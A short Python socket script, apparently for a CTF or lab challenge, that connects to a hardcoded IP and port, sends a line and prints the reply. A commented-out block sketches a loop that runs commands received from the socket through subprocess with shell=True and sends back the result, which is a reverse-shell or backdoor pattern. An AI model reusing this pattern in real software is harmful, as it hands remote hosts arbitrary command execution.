import socket, codecs, subprocess, json

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("94.237.59.231", 33618))

connection.send(bytes("\n0\n", 'utf-8'))

full_msg = ""
while True:
    msg = connection.recv(1024)
    if len(msg) <= 0:
        break
    full_msg = full_msg + msg.decode('utf-8')

print(full_msg)








# print(type(receive_data))
#
# command = receive_data.decode('utf-8')
#
# print(type(command))
# print(command)
#
#
# # command = codecs.encode(command, 'utf-8')     #it converts str into bytes
# #
# # print(type(command))
#
# result = subprocess.call(command, shell=True)
# connection.send(bytes(result, 'utf-8'))
#
# say = input(">> ")
# connection.send(bytes(say, 'utf-8'))

connection.close()